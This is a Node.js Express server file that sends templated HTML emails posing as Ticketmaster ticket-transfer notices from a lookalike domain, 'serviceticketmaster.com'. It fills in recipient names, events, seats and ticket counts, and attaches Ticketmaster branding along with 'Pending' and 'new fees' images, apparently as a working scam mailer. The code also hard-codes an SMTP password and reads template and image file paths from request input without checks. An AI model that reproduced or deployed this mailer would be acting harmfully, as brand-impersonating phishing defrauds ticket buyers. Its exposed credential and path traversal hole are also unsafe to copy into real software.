const express = require('express');
const nodemailer = require('nodemailer');
const bodyParser = require('body-parser');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();
const port = 5000;

// Configure CORS to allow requests from your frontend
const corsOptions = {
  origin: 'http://localhost:3000',  // Update this with your frontend URL
  methods: 'GET,POST',
  allowedHeaders: 'Content-Type',
};

app.use(cors(corsOptions));  // Apply CORS middleware
app.use(bodyParser.json());  // Parse incoming JSON requests

// Email sending route
app.post('/send-email', async (req, res) => {
  const { 
    email, 
    cl, 
    name, 
    lastname, 
    head,
    sent, 
    title, 
    event, 
    date, 
    day, 
    time, 
    state, 
    location, 
    img,
    status,
    sec,
    template,
  } = req.body;

  // Load the selected HTML template
  const templatePath = path.join(__dirname, 'email files', template);
  const htmlContent = fs.readFileSync(templatePath, 'utf8');

  // Paths to images and attachments
  const ticketPath = path.join(__dirname, 'new fees', 'emailpics', 'Pending.WEBP');
  const masterPath = path.join(__dirname, 'new fees', 'emailpics', 'Ticketmaster.jpg');
  const bottomPath = path.join(__dirname, 'new fees', 'emailpics', 'Ticketmaster.jpeg');
  const imgPath = path.join(__dirname, 'images', img);

  // Configure Nodemailer
  const transporter = nodemailer.createTransport({
    host: 'smtp.privateemail.com',
    port: 465, 
    secure: true,
    auth: {
      user: 'customer_support@serviceticketmaster.com',
      pass: 'tupy-ekgl-abkz-vrue',
    },
  });

  const attachments = [
    { path: imgPath, cid: 'imgCID' },
    { path: ticketPath, cid: 'ticketCID' },
    { path: masterPath, cid: 'masterCID' },
    { path: bottomPath, cid: 'bottomCID' },
  ];

  // Personalize the email template with dynamic content
  const personalizedHtml = htmlContent
    .replace(/{{%email%}}/g, email)
    .replace(/{{%cl%}}/g, cl)
    .replace(/{{%name%}}/g, name)
    .replace(/{{%lastname%}}/g, lastname)
    .replace(/{{%head%}}/g, head)
    .replace(/{{%sent%}}/g, sent)
    .replace(/{{%event%}}/g, event)
    .replace(/{{%title%}}/g, title)
    .replace(/{{%date%}}/g, date)
    .replace(/{{%day%}}/g, day)
    .replace(/{{%time%}}/g, time)
    .replace(/{{%state%}}/g, state)
    .replace(/{{%location%}}/g, location)
    .replace(/{{%status%}}/g, status)
    .replace(/{{%sec%}}/g, sec);

  const mailOptions = {
    from: 'Ticketmaster <customer_support@serviceticketmaster.com>',
    to: email,
    subject: `${name} ${lastname} You ${head} ${sent} ${sent < 2 ? "Ticket" : "Tickets"} from ${cl}`,
    html: personalizedHtml,
    replyTo: '<customer_support@serviceticketmaster.com>',
    attachments: attachments,
  };

  // Send the email
  try {
    const info = await transporter.sendMail(mailOptions);
    console.log('Email sent:', info.response);
    res.status(200).json({ message: 'Email sent successfully!' });
  } catch (error) {
    console.error(error.message);
    res.status(500).json({ message: 'Failed to send email.', error: error.message });
  }
});

// Start the server
app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});
